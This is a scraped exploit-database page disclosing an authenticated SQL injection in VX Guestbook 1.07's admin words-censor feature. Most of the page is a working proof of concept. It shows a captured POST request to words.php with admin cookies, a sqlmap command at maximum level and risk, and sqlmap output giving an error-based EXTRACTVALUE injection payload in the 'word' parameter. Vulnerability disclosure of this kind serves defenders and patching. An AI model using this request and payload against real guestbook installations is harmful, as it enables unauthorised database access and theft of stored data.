---
title: VX Guestbook 1.07 SQL Injection
url: https://cxsecurity.com/issue/WLB-2025080004
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-08-06
fetch_date: 2025-10-07T00:17:49.325922
---

# VX Guestbook 1.07 SQL Injection

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **VX Guestbook 1.07 SQL Injection** **2025.08.05**  Credit:  **[Trmswrr](https://cxsecurity.com/author/Trmswrr/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **N/A** | |

# Exploit Title: VX Guestbook SQL Injection Authenticated
# Date: 2025-08-02
# Exploit Author: tmrswrr
# Category : Webapps
# Vendor: https://phpversion.com/
# Version 1.07
1. Access the Admin Panel:
- Click Words Censor > https://127.0.0.1/VX\_Guestbook/admin/words.php > Click Update
- Catch Request
POST /VX\_Guestbook/admin/words.php HTTP/1.1
Host: 127.0.0.1
Cookie: admin\_name=admin; admin\_pass=1a1dc91c907325c69271ddf0c944bc72; \_ga\_YYDPZ3NXQQ=GS2.1.s1754162976$o6$g1$t1754163087$j9$l0$h0; \_ga=GA1.1.797626112.1754131850; \_gcl\_au=1.1.1270393425.1754131851; AEFCookies1526[aefsid]=uoc6pbgy8qr8qbojj1y3tmlrm4u5vdcz; demo\_75=%7B%22sid%22%3A75%2C%22adname%22%3A%22admin%22%2C%22adpass%22%3A%22pass%22%2C%22url%22%3A%22https%3A%5C%2F%5C%2F127.0.0.1%5C%2FVX\_Guestbook%22%2C%22adminurl%22%3A%22https%3A%5C%2F%5C%2F127.0.0.1%5C%2FVX\_Guestbook%5C%2Fadmin%22%2C%22dir\_suffix%22%3A%22%22%7D
User-Agent: Mozilla/5.0 (X11; Linux x86\_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,\*/\*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 27
Origin: http://127.0.0.1
Dnt: 1
Sec-Gpc: 1
Referer: http://127.0.0.1/VX\_Guestbook/admin/words.php
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
Connection: keep-alive
word=aaa&add\_action=Update
2. sqlmap -r request.txt --batch --level 5 --risk 3 --thread 10 --dbms=mysql
sqlmap identified the following injection point(s) with a total of 2342 HTTP(s) requests:
---
Parameter: word (POST)
Type: error-based
Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
Payload: word=aaa' AND EXTRACTVALUE(1477,CONCAT(0x5c,0x7178626271,(SELECT (ELT(1477=1477,1))),0x71716a7071)) AND 'OPmT'='OPmT&add\_action=Update
---
[15:52:33] [INFO] the back-end DBMS is MySQL
web application technology: PHP 5.4.45, Apache
back-end DBMS: MySQL >= 5.1

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2025080004)

[Tweet](https://twitter.com/share)

Vote for this issue:
 2
 0

100%

0%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top